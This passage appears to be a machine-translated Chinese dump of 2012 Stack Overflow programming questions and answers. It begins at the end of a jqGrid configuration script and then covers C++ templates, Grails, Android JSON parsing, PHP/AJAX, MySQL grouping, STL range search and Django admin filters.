                                                type:'click',
                                                fn:function(e){
                                                 $('#formQuickSurvey').validationEngine({promptPosition:'bottomLeft',validationEventTrigger:'keyup'});                                  
                                                }
                                                }]
                                                }
                                    },
                                   {name:'cost',index:'cost',align:'center',editable:true,editrules:{number:true},
                                   editoptions:{class:'validate[custom[number]]',
                                    dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                calculateannualCost(e);
                                                }
                                                },{
                                                type:'click',
                                                fn:function(e){
                                                 $('#formQuickSurvey').validationEngine({promptPosition:'bottomLeft',validationEventTrigger:'keyup'});                                  
                                                }
                                                }]
                                                }
                                    },                     
                                   {name:'sizes',index:'sizes',align:'center',edittype:'select',editable:true,editoptions:{multiple:true,value:{},
                                   dataInit: function (elem) {
                                                                    var v = $(elem).val();
                                                                    if(v!=''){
                                                                            jQuery('#curruntppeGridgrid').setColProp('sizesId', { editoptions: { defaultValue:v}} );
                                                                        }
                                                                    },
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                setHiddensizes(e);
                                                }}]
                                                }
                                                },
                                   {name:'annualCost',index:'annualCost',align:'center',editable: true, editoptions: { readonly: 'readonly' }},
                                   {name:'vp2',index:'vp2',align:'center',editable: true, hidden: false, edittype: 'select',
                                   editoptions: { multiple: false, value: eval('(' + vp2fList + ')'),
                                   dataInit: function (elem) {
                                                                var v = $(elem).val();
                                                                if(v!=''){
                                                                        jQuery('#curruntppeGridgrid').setColProp('vp2Id', { editoptions: { defaultValue:v}} );
                                                                    }
                                                                },
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                setHiddenvp2(e);
                                                validateCategoryandVP2(e);
                                                }}]
                                                 },
                                   editrules: { required: false }}                     
                                   ],
                        cmTemplate:{sortable:false},
                        width: eval('gridWidth()'),
                        pgbuttons:false,
                        pginput:false,
                        viewrecords:false,
                        //pager: '#curruntppeGridpager',
                        toppager:true,
                        multiselect:true,
                        editurl: 'editsurveyppe',
                        caption: 'Current PPE',
                        //forceFit:true,
                        hiddengrid:true,
                        hidegrid:true,
                        headertitles:true,
                        postData: { appId: function() { return $('#selectApplication option:selected').val(); }
                        },
                        onHeaderClick : function(gridstate){

                            if(gridstate == 'visible'){
                                $("#curruntppeGridgrid_toppager").show();
                            }
                            else{
                                $("#curruntppeGridgrid_toppager").hide();
                            }

                        },
                        loadComplete: function() {
                            $('#del_curruntppeGridgrid_top').removeClass('ui-state-disabled');//this is added to enable delete button after record reload
                            if(jQuery('#curruntppeGridgrid').jqGrid('getGridParam','gridstate')!='visible')
                            {
                                $("#curruntppeGridgrid_toppager").hide();
                            }
                            else{
                                $("#curruntppeGridgrid_toppager").show();
                            }
                        /*  if($("#${gridId}grid").getGridParam("records")==0 || $("#${gridId}grid").getGridParam("records")==false)
                            {
                                $('#del_${gridId}grid').addClass('ui-state-disabled');
                                $('#${gridId}grid_iledit').addClass('ui-state-disabled');
                            }
                            else
                                {
                                    $('#del_${gridId}grid').removeClass('ui-state-disabled');
                                    $('#${gridId}grid_iledit').removeClass('ui-state-disabled');
                                };*/
                        },
                        afterInsertRow:function(){//this is added to disable delete button while adding record
                            $('#del_curruntppeGridgrid_top').addClass('ui-state-disabled');

                        /*if($('#del_${gridId}grid').hasClass('ui-state-disabled'))
                                {

                                }*/
                        }
                        ,ajaxSelectOptions: { cache: false }

                    });

                    jQuery("#curruntppeGridgrid").jqGrid('navGrid',"#curruntppeGridpager",{cloneToTop:true,position:'right',edit:false,add:false,del:true,search:false,refresh:true,pgbuttons:false},
                            {},{},{mtype:'POST',reloadAfterSubmit:true,
                                serializeDelData: function (postdata) {
                                    var row = jQuery('#curruntppeGridgrid').getRowData(postdata.id);
                                    // append postdata with extra information 
                                    return {id: postdata.id, oper: postdata.oper,gridId:'current'};
                                }},{});

                    //top toolbar
                    jQuery("#curruntppeGridgrid").jqGrid('inlineNav','#curruntppeGridgrid_toppager',
                            {position:'right',editParams : {aftersavefunc:function()
                                {
                                    $("#curruntppeGridgrid").jqGrid().trigger("reloadGrid");
                                    $('#del_curruntppeGridgrid_top').removeClass('ui-state-disabled');//this is added to enable delete button after saveing record
                                },oneditfunc: function() {
                                    $('#del_curruntppeGridgrid_top').addClass('ui-state-disabled');//this is added to disable delete button while editing record
                                },
                                afterrestorefunc :function() {
                                    $('#del_curruntppeGridgrid_top').removeClass('ui-state-disabled');//this is added to enable delete button while cancelling record
                                    /*if($("#${gridId}grid").getGridParam("records")==0 || $("#${gridId}grid").getGridParam("records")==false)
                                    {
                                        $('#del_${gridId}grid').addClass('ui-state-disabled');
                                        $('#${gridId}grid_iledit').addClass('ui-state-disabled');
                                    }
                                    else
                                        {
                                            $('#del_${gridId}grid').removeClass('ui-state-disabled');
                                            $('#${gridId}grid_iledit').removeClass('ui-state-disabled');
                                        };*/
                                }
                                ,extraparam:{
                                    currentApplicationId: function() { return $("#selectApplication option:selected").val(); }
                                }
                              },

                              "restoreAfterSelect":false
                            });

                        jQuery('#curruntppeGridgrid').jqGrid('setGroupHeaders',{
                        useColSpanStyle: true,
                        groupHeaders:[{
                            startColumnName: 'averagelifetime',
                            numberOfColumns: 2,
                            titleText: '<em>Average Lifetime</em>'
                            }
                            ]});

            });     
            </script>

            <div id="curruntppeGridContainer" class="pad7 ansellGridContainer">
            <table id="curruntppeGridgrid" class="ansellGrid"></table>
            <div id="curruntppeGridpager" class="scroll" style="text-align:center;"></div>
            </div>

            <div id="curruntppeGriddialog" title="Feature not supported"
                style="display:none">
            <p>
            That feature is not supported.
            </p>
            </div>

            <div id="curruntppeGriddialogSelectRow" title="Warning" style="display:none">
            <p>
            Please select row
            </p>
            </div> 
```

# c++ - C++：调试 C++ 模板链接器错误

> ID：12215732
> 
> 赞同：0
> 
> 时间：2012-08-31T12:50:26.250
> 
> 标签：c++, debugging, templates, linker, linker-errors

我在以下代码中遇到了一个奇怪的链接器错误：

`A<T>`该代码使用类型特征为所有`T`不是`X`.

```
class X{};

#include <type_traits>

//Enabler for all types that are not a subtype of X
#define enabler(T) typename std::enable_if<!std::is_base_of<X, T>::value>::type

//A template (second param is only for enabling partial specializations)
template <typename T, typename = void>
struct A{};

//Partial template specialization for instances
//that do not use a T which is a subclass of X
template <typename T>
struct A<T, enabler(T)>{
    static int foo(); //Declaration only!
};

//Definition of foo() for the partial specialization
template <typename T,enabler(T)>
static int foo(){
    return 4;
}

int bar = A<int>::foo();

int main(){} 
```

即使这只是一个文件，链接也会失败。问题似乎是 foo() 的非内联定义。一旦我内联它，一切正常。在实际代码中，由于循环依赖，我无法内联它。

错误如下：

```
/tmp/ccS7UIez.o: In function `__static_initialization_and_destruction_0(int, int)':
X.cpp:(.text+0x29): undefined reference to `A<int, void>::foo()'
collect2: ld returned 1 exit status 
```

那么问题出在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T13:57:13.980

静态成员函数的定义`A<T, enabler(T)>::foo`有语法错误，应该是：

```
template <typename T>
int A<T, enabler(T)>::foo(){
    return 4;
} 
```

# forms - Grails 表单字段始终为空

> ID：12215734
> 
> 赞同：0
> 
> 时间：2012-08-31T12:50:38.603
> 
> 标签：forms, grails

我想在我的项目的注册页面中添加密码确认。但我对我的一个领域的价值有疑问。所有字段都可以，但 password2 字段是确认密码，是 User 域类的临时字段。这是我的域、控制器和视图代码

领域类：

```
class User {
String fullName
String username
String email
String password
String password2

static transients = ['password2']

static constraints = {
    username size: 5..15, blank: false, unique: true
    email email: true, blank: false
    password  blank:false, size:5..15, matches:/[\S]+/, validator:{ val, obj ->
        if (obj.password != obj.password2)
            return 'user.password.dontmatch'
    }
}
} 
```

控制器的一部分：

```
 if (request.method == 'POST') {
        // create domain object and assign parameters using data binding
        def u = new User(params)
        if (! u.save()) {
            // validation failed, render registration page again
             flash.error = "error(s) creating user: Value of the confirmation password is: "+u.password2
            //render(view:"/signup",model:[user:user])
            return [user:u]
        } else {
            // validate/save ok, store user in session, redirect to homepage
            session.user = u
            redirect(controller:'home')
            return
        }
    } else if (session.user) {
        // don't allow registration while user is logged in
        redirect(controller:'home')
        return
    } 
```

以及视图的一部分：

```
<div><input class="pretty-input ${hasErrors(bean:user,field:'email','input-error')}" type="email" name="email" value="${user?.email}" ></input><span>— Enter email</span></div>
<div><input class="pretty-input ${hasErrors(bean:user,field:'password','input-error')}" type="password" name="password"></input><span>— Choose a password</span></div>
<div><input class="pretty-input ${hasErrors(bean:user,field:'password2','input-error')}" type="password" name="password2"></input><span>— Repeat the password</span></div> 
```

如果我删除密码的自定义验证，我的代码可以工作，因为密码 2 的值始终为空。我为什么在所有其他字段都有效但密码 2 无效时会发生这种情况。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:01:32.537

Trasients 字段默认情况下不可绑定，因此您不能传递参数来填充它。

你可以这样做：

```
static constraints = {
    ... your code here
    password2 bindable: true
} 
```

但我建议您使用命令对象来验证该条件，这很聪明。

# android - Android JSONObject 问题

> ID：12215735
> 
> 赞同：1
> 
> 时间：2012-08-31T12:50:40.217
> 
> 标签：android, listview, adapter

我有使用 asynctask 从 URL 下载 JSON 数据并将其传递给新活动的启动活动，女巫需要解析它并填充列表视图，但是在下载应用程序崩溃后，在日志聊天中说它无法将字符串转换为 json 对象，这里是飞溅活动代码

```
public class Init extends Activity {

static final String DEFAULT_URL = "http://api.androidhive.info/music/music.xml";

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
    setContentView(R.layout.init);

    WebView loader = (WebView) findViewById(R.id.loader);
    loader.loadUrl("file:///android_asset/index.html");

    new LoadingTask().execute(DEFAULT_URL);

}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

public class LoadingTask extends AsyncTask<String, Object, Object>{
    XMLParser parser = new XMLParser();
    JSONParser jParser = new JSONParser();
    @Override
    protected Object doInBackground(String... params) {
        // TODO Auto-generated method stub
        String URL = params[0];
        JSONObject json = jParser.getJSONFromUrl(URL);
        //String xml = parser.getXmlFromUrl(URL); // getting XML from URL
         // getting DOM element
        return json;
    }

    protected void onPostExecute(Object result){
        Intent startApp = new Intent("com.example.androidhive.HOME");
        startApp.putExtra("json", result.toString());
        startActivity(startApp);
        //finish();
    }       
   }
 } 
```

这是主要活动的来源

```
public class Home extends Activity {
    // All static variables

    // XML node keys
    static final String KEY_SONG = "song"; // parent node
    static final String KEY_ID = "id";
    static final String KEY_TITLE = "title";
    static final String KEY_ARTIST = "artist";
    static final String KEY_DURATION = "duration";
    static final String KEY_THUMB_URL = "thumb_url";

    public static final String TAG_NEWS = "news";
    public static final String TAG_ID = "id";
    public static final String TAG_TITLE = "title";
    public static final String TAG_STORY = "story";
    public static final String TAG_SH_STORY = "shorten";
    public static final String TAG_DATETIME = "datetime";
    public static final String TAG_AUTHOR = "author";
    public static final String TAG_IMG = "img";

    ListView list;
    LazyAdapter adapter;
    Button mBtnNaslovnica;
    private ViewSwitcher viewSwitcher;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.main);

        mBtnNaslovnica = (Button) findViewById(R.id.mBtnNaslovnica);
        mBtnNaslovnica.setSelected(true);
        TextView txtView=(TextView) findViewById(R.id.scroller);
    txtView.setSelected(true);              

            ArrayList<HashMap<String, String>> homeList = new ArrayList<HashMap<String, String>>();             

                JSONObject jsonobj;
                try {
                    jsonobj = new JSONObject(getIntent().getStringExtra("json"));
                    JSONArray news = jsonobj.getJSONArray(TAG_NEWS);
                    for(int i = 0; i < news.length(); i++){
                        JSONObject c = news.getJSONObject(i);

                        // Storing each json item in variable
                        String id = c.getString(TAG_ID);
                        String title = c.getString(TAG_TITLE);
                        String story = c.getString(TAG_STORY);
                        String shorten = c.getString(TAG_SH_STORY);
                        String author = c.getString(TAG_AUTHOR);
                        String datetime = c.getString(TAG_DATETIME);
                        String img = c.getString(TAG_IMG);

                        // creating new HashMap
                        HashMap<String, String> map = new HashMap<String, String>();

                        // adding each child node to HashMap key => value
                        map.put(TAG_ID, id);
                        map.put(TAG_TITLE, title);
                        map.put(TAG_SH_STORY, shorten);
                        map.put(TAG_IMG, img);
                        map.put(TAG_AUTHOR, author);

                        // adding HashList to ArrayList
                        homeList.add(map);}
                } catch (JSONException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }               

            list=(ListView)findViewById(R.id.list);

            // Getting adapter by passing xml data ArrayList
            adapter=new LazyAdapter(this, homeList);        
            list.setAdapter(adapter);

            // Click event for single list row
            list.setOnItemClickListener(new OnItemClickListener() {

                @Override
                public void onItemClick(AdapterView<?> parent, View view,int position, long id) {
                    String cur_title = ((TextView) view.findViewById(R.id.title)).getText().toString();
                    String cur_artis = ((TextView) view.findViewById(R.id.artist)).getText().toString();
                    String cur_duration  = ((TextView) view.findViewById(R.id.duration)).getText().toString();
                    ImageView cur_img = (ImageView) view.findViewById(R.id.list_image);
                    String cur_img_url = (String) cur_img.getTag();

                    Intent i = new Intent("com.example.androidhive.CURENTNEWS");
                    i.putExtra("CUR_TITLE", cur_title);
                    i.putExtra("CUR_ARTIS", cur_artis);
                    i.putExtra("CUR_DURATION", cur_duration);
                    i.putExtra("CUR_IMG_URL", cur_img_url);
                    startActivity(i);
                }
            });     
        }               
    } 
```

这是包含适配器的类的来源

```
public class LazyAdapter extends BaseAdapter {

private Activity activity;
private ArrayList<HashMap<String, String>> data;
private static LayoutInflater inflater=null;
public ImageLoader imageLoader; 

public LazyAdapter(Activity a, ArrayList<HashMap<String, String>> d) {
    activity = a;
    data=d;
    inflater = (LayoutInflater)activity.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    imageLoader=new ImageLoader(activity.getApplicationContext());
}

public int getCount() {
    return data.size();
}

public Object getItem(int position) {
    return position;
}

public long getItemId(int position) {
    return position;
}

public View getView(int position, View convertView, ViewGroup parent) {
    View vi=convertView;
    if(convertView==null)
        vi = inflater.inflate(R.layout.list_row, null);

    TextView title = (TextView)vi.findViewById(R.id.title); // title
    TextView artist = (TextView)vi.findViewById(R.id.artist); // artist name
    TextView duration = (TextView)vi.findViewById(R.id.duration); // duration
    ImageView thumb_image=(ImageView)vi.findViewById(R.id.list_image); // thumb image

    HashMap<String, String> n = new HashMap<String, String>();
    n = data.get(position);

    // Setting all values in listview
    title.setText(n.get(Home.TAG_TITLE));
    artist.setText(n.get(Home.TAG_AUTHOR));
    duration.setText(n.get(Home.TAG_DATETIME));
    thumb_image.setTag(n.get(Home.TAG_IMG));
    imageLoader.DisplayImage(n.get(Home.TAG_IMG), thumb_image);
    return vi;
  }
} 
```

这是日志聊天

```
 08-31 14:34:41.066: V/xcli2(2349): DnsResolver.createDnsResolver() ok in run of WebCoreThread
08-31 14:34:42.546: E/JSON Parser(2349): Error parsing data org.json.JSONException: Value <?xml of type java.lang.String cannot be converted to JSONObject
08-31 14:34:42.546: W/dalvikvm(2349): threadid=1: thread exiting with uncaught exception (group=0x400207d8)
08-31 14:34:42.546: E/AndroidRuntime(2349): FATAL EXCEPTION: main
08-31 14:34:42.546: E/AndroidRuntime(2349): java.lang.NullPointerException
08-31 14:34:42.546: E/AndroidRuntime(2349):     at com.example.androidhive.Init$LoadingTask.onPostExecute(Init.java:58)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.os.AsyncTask.finish(AsyncTask.java:417)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.os.AsyncTask.access$300(AsyncTask.java:127)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.os.AsyncTask$InternalHandler.handleMessage(AsyncTask.java:429)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.os.Handler.dispatchMessage(Handler.java:99)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.os.Looper.loop(Looper.java:123)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at android.app.ActivityThread.main(ActivityThread.java:4645)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at java.lang.reflect.Method.invokeNative(Native Method)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at java.lang.reflect.Method.invoke(Method.java:521)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:878)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:636)
08-31 14:34:42.546: E/AndroidRuntime(2349):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:53:17.987

> `Error parsing data org.json.JSONException: Value <?xml of type java.lang.String cannot be converted to JSONObject`

从这个api`http://api.androidhive.info/music/music.xml`看来没有`JSONObject` 你，最好看看[android-xml-parsing-tutorial](http://www.androidhive.info/2011/11/android-xml-parsing-tutorial/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:15:01.770

你好请看看这个。

```
>     ?xml of type java.lang.String cannot be converted to JSONObject
>     You can not change xml to json object.If work on json then you have to use json object and json array. 
```

请有一个链接可能对你有帮助。 [http://p-xr.com/android-tutorial-how-to-parse-read-json-data-into-a-android-listview/](http://p-xr.com/android-tutorial-how-to-parse-read-json-data-into-a-android-listview/)

# php - JSON 对象属性未定义

> ID：12215736
> 
> 赞同：2
> 
> 时间：2012-08-31T12:50:50.287
> 
> 标签：php, javascript, ajax, json, undefined

我从 AJAX 调用中返回一个 JSON 对象并记录如下结果：

```
console.log(response); 
```

这是控制台中记录的响应：

```
{"filename":"new.jpg","orientation":"vertical"} 
```

然而，当我

```
console.log(response.orientation); 
```

我得到一个未定义的响应。

我读过的大多数答案都表明返回了一个数组而不是一个对象，并且 response[0].orientation 应该可以工作，但这里不是这种情况。当我将相同的数组分配给控制台中的另一个变量时：

```
var obj = {"filename":"new.jpg","orientation":"vertical"} 
```

然后 obj.orientation 返回正确的值。

我在 PHP 中创建 JSON 对象：

```
$response=array('filename' => $newfilename, 'orientation' => $orientation);
$response=json_encode($response);
echo $response; 
```

为什么属性显示未定义很明显吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-31T13:00:57.833

要么放：

```
header("Content-type: application/jason"); 
```

在 PHP 中，`dataType: "json"`在 JavaScript 中的 AJAX 调用中指定，或者调用`JSON.parse`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:54:16.207

您将需要解析您的字符串以获取正确的 JSON 对象。JSON.parse（响应）；将为您提供一个 JSON 对象，您可以从中读取属性

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T13:01:55.707

您可以在 jsfiddle 中尝试以下示例吗？

这不是使用 JSON.parse() 的更好方法；或 $.parseJSON(); （jQuery版本）

但是，如果这是您的问题，json 作为字符串返回，这可以修复它，您可以更改您的代码

[http://jsfiddle.net/dadviegas/gf8Yq/](http://jsfiddle.net/dadviegas/gf8Yq/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T14:19:51.333

I think the ajax / php part should look like Ajax

```
$.ajax({
        type: "POST",   
        url: "link.php",
        dataType: "json",
        success: function(result){
             alert(result.orientation); 
        }
    }); 
```

PHP

```
$response=array("filename" => "$newfilename", "orientation" => "$orientation");
$response=json_encode($response);
echo $response; 
```

Make sure that use at least 5.2 php version

# php - 具有 2 个值的下拉列表

> ID：12215738
> 
> 赞同：-5
> 
> 时间：2012-08-31T12:51:08.173
> 
> 标签：php

我需要创建一个下拉列表，它有两个值“OK”和“NOK”，默认情况下应该根据 $Status 的值选择一个。用户应该能够更改选择或让默认选项。我该如何管理？我试过的：

```
<select name="Status">
  <option value="OK">OK selected="selected"</option>
  <option value="NOK">NOK</option>
</select> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:55:19.570

```
<select>
  <option value="OK" <?php if($Status == "OK") echo 'selected="selected"';?>>OK</option>
  <option value="NOK" <?php if($Status == "NOK") echo 'selected="selected"';?>>NOK</option>
</select> 
```

您可以根据需要向 select 添加 id 和/或 name 属性。

# php - 如何在mysql中获取所有相似的命名记录

> ID：12215743
> 
> 赞同：2
> 
> 时间：2012-08-31T12:51:22.577
> 
> 标签：php, mysql

我有一个包含存储数据的表，例如：

```
product_name | quantity | tert
ASIZ A4 100 FOX | 20| BUYER1
CERVEZA A6 150 FOX | 15| BUYER1
ASIZ A4 150 FOX | 40| BUYER1   
CERVEZA A6 11 FOX | 15| BUYER1
QUINTA A6 150 FOX | 15| BUYER2
ASIZ A4 150 FOX | 33 | BUYER2
ASIZ A6 150 FOX | 15| BUYER2
CERVEZA A6 150 FOX | 15| BUYER2 
```

我想检索与第一个单词匹配的所有数据（例如**ASIZ**）对数量求和并将它们显示为：

```
BUYER1
Asiz - 60 pcs.
Cerveza = 30 pcs.
etc.

BUYER2
Asiz = 48 pcs.
Cerveza = 15 pcs. 
```

ETC

目前我正在使用2个while循环：

```
SELECT DISTINCT product_name 
FROM my_table 
WHERE buyer_code= '".$bcode."' 
GROUP BY product_name 
```

-- 我得到了产品名称

然后

```
SELECT DISTINCT product_name,tert, SUM(quantity) AS quantity 
FROM my_table 
WHERE buyer_code ='".$bcode."' AND 
      prouct_name LIKE '".$first_word_of_product_name."%' 
GROUP BY tert
ORDER BY data ASC 
```

我得到了正确的总和，但它每次找到类似的命名产品时都会列出它们（例如：**BUYER1：ASIZ - 2次等**）

表明：

```
Buyer1
ASIZ - 60
Cerveza - 30
ASIZ - 60
Cerveza - 30 
```

我知道它与product_name有关，但是我应该如何编写sql语句才能工作？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:57:38.847

```
SELECT SUBSTRING_INDEX(product_name, '.', 1) product, tert, SUM(quantity) quantity
FROM my_table
GROUP BY product, tert 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:59:56.907

从您的第二个 sql 中删除`tert`，它将按预期工作。

将此更改为

```
SELECT DISTINCT product_name,tert, SUM(quantity) AS quantity 
FROM my_table 
WHERE buyer_code ='".$bcode."' 
     AND prouct_name LIKE '".$first_word_of_product_name."%' 
GROUP BY tert 
ORDER BY data ASC 
```

这

```
SELECT DISTINCT product_name, SUM(quantity) AS quantity 
FROM my_table 
WHERE buyer_code ='".$bcode."' 
     AND prouct_name LIKE '".$first_word_of_product_name."%' 
GROUP BY product_name 
ORDER BY data ASC 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T13:08:46.293

跑

```
SELECT tert, SUBSTRING_INDEX(product_name,' ',1) as product, sum(quantity) as qty
FROM my_table 
GROUP BY tert, product
ORDER BY tert, product 
```

您的结果按*tert*排序，因此您可以逐个显示*产品*和*数量*，并在每次*tert*更改时显示*tert 。*

 ***更新**：如何输出数据的代码示例（未经测试）：

```
$tert = null;
foreach($rows as $row){
    if($rows['tert'] != $tert){
        $tert = $rows['tert'];
        echo $tert;
    }
    echo $row['product'], "-", $row['qty'];
} 
```

这里`$rows`- 所有获取的行。*

# c++ - stl向量中值的索引范围的算法

> ID：12215749
> 
> 赞同：1
> 
> 时间：2012-08-31T12:51:44.283
> 
> 标签：c++

我有一个数据表，如下所示。请注意，keyID 可以重复。我在向量结构中收集了以下数据，这些数据是排序的。

```
struct myData {
   int keyID;
   int value;
}

vector<myData> vecReadFromFile; 
```

现在用户输入一个特定的 keyID，我必须检查该值是否存在于向量中，如果存在我必须返回该值。如果不是我必须检查它落在哪些值之间，例如如果用户输入 120030，值在 120028 和 120039 之间，我应该得到这些值的索引，即在这个例子中，lowerIndex 和 upperIndex 为“2”和“3”（作为向量索引从 0 开始）

如果用户输入较少的 keyID，即 120001，则不返回任何值。同样，用户输入的 keyID 大于最后一个键值，然后返回不同的错误代码。

基本上我想有效地找到给定键值的索引范围。我添加的代码似乎不适用于上面的例子我提到了什么是错误？

我可以更改逻辑以使用 STL 提供的算法。请建议。

我们如何在 C++ 中有效地实现这个算法？请求以示例代码作为函数。注意这里我会在我的项目中多次调用函数，所以它必须有效。

```
keyID   Value   

120002  10  
120025  20  
120028  25  
120039  30  
120042  -   
120048  40  
120052  50  
120112  60  
120117  70  
120123  70  
120126  80  
120130  90 
```

我这里有一些代码

```
 //==========================================================================
// FindBounds
bool FindBounds(const KEY& cTarget, UINT& uLower, UINT& uUpper)
{
  uLower = -1;
  uUpper = -1;

  // start with full range of data.
  uLower = 0;
  uUpper = m_uCount-1; // Here I have m_uCount as vector.size()

 // narrow the bounds as much as possible.
 while (uUpper - uLower > 1 && cTarget != m_pKeys[uLower])
 {  
    // split the range in half and discard the half that the key does not belong to. 
    UINT uBound = uUpper - (uUpper-uLower)/2;
    // keep the lower range.
    if (KeyInRange(uLower, uBound, cTarget))
    {
       uUpper = uBound;
    }
    // keep the upper range.
    else
    {
      uLower = uBound;
    }
 }

}

bool KeyInRange(UINT uLower, UINT uUpper, const KEY& cTarget)
{
    // check if target is within range.
    if (m_pKeys[uLower] <= cTarget)
    {
    if (m_pKeys[uUpper] > cTarget || (m_pKeys[uLower] == cTarget && m_pKeys[uLower] == m_pKeys[uUpper]))
    {
            return true;
    }
     }
    // target is not within range.
    return false;
} 
```

感谢您的时间和帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:55:26.053

有[`std::equal_range`](http://en.cppreference.com/w/cpp/algorithm/equal_range)算法。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-31T12:58:49.300

`std::lower_bound()`来自 STL，`<algorithm>`标题： [http ://en.cppreference.com/w/cpp/algorithm/lower_bound](http://en.cppreference.com/w/cpp/algorithm/lower_bound)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:59:57.393

1）我认为，如果您要通过键查找某些值，最好选择 STL 容器**multiset**，它允许键重复。

2）查看方法`lower_bound()`，`upper_bound()`它们可能适用于您尝试做的事情

# django - 我可以在 django admin 中制作 list_filter 以仅显示引用的 ForeignKeys 吗？

> ID：12215751
> 
> 赞同：69
> 
> 时间：2012-08-31T12:51:45.963
> 
> 标签：django, django-admin

我有一个 django 应用程序，它有两个这样的模型：

```
class MyModel(models.Model):
    name = models.CharField()
    country = models.ForeignKey('Country')

class Country(models.Model):
    code2 = models.CharField(max_length=2, primary_key=True)
    name = models.CharField() 
```

的管理类`MyModel`看起来像这样：

```
class MyModelAdmin(admin.ModelAdmin):
    list_display = ('name', 'country',)
    list_filter = ('country',)
admin.site.register(models.MyModel, MyModelAdmin) 
```

该`Country`表包含约 250 个国家/地区。`MyModel`某些实例实际上仅引用了少数几个国家。

问题是 django 管理员中的列表过滤器在过滤器面板中**列出了所有国家/地区。**在这种情况下，列出所有国家（而不仅仅是那些被实例引用的国家）几乎违背了使用列表过滤器的目的。

是否有一些仅`MyModel`在列表过滤器中显示作为选项引用的国家？（我使用 Django 1.3。）

* * *

## 回答 #1

> 赞同：100
> 
> 时间：2012-08-31T13:19:46.517

从 Django 1.8 开始，有一个内置的`RelatedOnlyFieldListFilter`，您可以使用它来显示相关国家/地区。

```
class MyModelAdmin(admin.ModelAdmin):
    list_display = ('name', 'country',)
    list_filter = (
        ('country', admin.RelatedOnlyFieldListFilter),
    ) 
```

对于 Django 1.4-1.7，[`list_filter`](https://docs.djangoproject.com/en/1.8/ref/contrib/admin/#django.contrib.admin.ModelAdmin.list_filter)允许您使用`SimpleListFilter`. 应该可以创建一个简单的列表过滤器来列出您想要的值。

如果您无法从 Django 1.3 升级，则需要使用内部且未记录的`FilterSpec`api。Django Admin 中的 Stack Overflow 问题[*Custom Filter*](https://stackoverflow.com/questions/991926/custom-filter-in-django-admin)应该为您指明正确的方向。

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2013-01-28T19:48:32.653

我知道问题是关于 Django 1.3 但是你提到很快升级到 1.4。对于像我这样正在寻找 1.4 解决方案但发现此条目的人来说，我决定展示使用[SimpleListFilter](https://docs.djangoproject.com/en/1.4/ref/contrib/admin/#django.contrib.admin.ModelAdmin.list_filter)（可用 Django 1.4）的完整示例，以仅显示引用的（相关的、使用的）外键值

```
from django.contrib.admin import SimpleListFilter

# admin.py
class CountryFilter(SimpleListFilter):
    title = 'country' # or use _('country') for translated title
    parameter_name = 'country'

    def lookups(self, request, model_admin):
        countries = set([c.country for c in model_admin.model.objects.all()])
        return [(c.id, c.name) for c in countries]
        # You can also use hardcoded model name like "Country" instead of 
        # "model_admin.model" if this is not direct foreign key filter

    def queryset(self, request, queryset):
        if self.value():
            return queryset.filter(country__id__exact=self.value())
        else:
            return queryset

# Example setup and usage

# models.py
from django.db import models

class Country(models.Model):
    name = models.CharField(max_length=64)

class City(models.Model):
    name = models.CharField(max_length=64)
    country = models.ForeignKey(Country)

# admin.py
from django.contrib.admin import ModelAdmin

class CityAdmin(ModelAdmin):
    list_filter = (CountryFilter,)

admin.site.register(City, CityAdmin) 
```

在示例中，您可以看到两个模型 - 城市和国家。城市有国家的外键。如果您使用常规 list_filter = ('country',) 您将拥有选择器中的所有国家/地区。然而，此片段仅过滤相关国家 - 与城市至少有一种关系的国家。

最初的想法来自[这里](http://jmduke.net/post/39953950546/custom-admin-filters-in-django)。非常感谢作者。改进了类名，以便更清晰地使用 model_admin.model 而不是硬编码的模型名。

示例也可在 Django Snippets 中找到：http: [//djangosnippets.org/snippets/2885/](http://djangosnippets.org/snippets/2885/)

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2015-01-08T09:41:14.810

